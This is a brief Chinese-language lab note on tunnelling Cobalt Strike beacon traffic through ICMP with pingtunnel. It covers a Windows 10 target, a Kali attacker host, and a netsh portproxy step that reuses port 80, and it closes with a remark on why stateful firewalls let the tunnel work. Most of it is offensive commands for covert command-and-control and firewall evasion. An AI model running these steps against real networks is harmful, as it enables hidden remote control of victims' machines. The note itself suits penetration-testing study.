# ICMP隧道

./pingtunnel -type server

kali:192.168.111.128
目标机:win10192.168.111.130
入站规则:80(TCP)
出站规则:ICMP


将本地TCP端口6666转发到192.168.111.128:7777(kali)上,通过6666的TCP流量封装为ICMP,到7777解封
```
pingtunnel -type client -l :6666 -s 192.168.111.128 -t 192.168.111.128:7777 -tcp 1 -noprint 1 -nolog 1
```

-l：本地监听端口
-s：ICMP服务器IP
-t：服务端转发目标

CS生成:(reverse_http)
(目标机)127.0.0.1 6666(目标机后门)
192.168.111.128 7777(监听上线)
http->icmp出站

beacon_bind
监听目标机的6666(后门)
可以采用端口复用
```
# 在目标机执行（管理员权限）：
netsh interface portproxy add v4tov4 listenport=80 connectaddress=127.0.0.1 connectport=6666

# 然后：
pingtunnel -type client -l 0.0.0.0:80 -s 192.168.111.128 -t 192.168.111.128:7777

CS:connect 192.168.111.130:80
```
```
防火墙理解:
内网主机主动发出 ICMP 请求（出站允许） → 外网服务器返回 ICMP 响应（入站被拦截）
​但实际可用！​​ 因为：
防火墙通常允许 ​已建立会话的响应包入站​（状态化防火墙）
响应包属于内网主机主动请求的回复，不会被拦截
```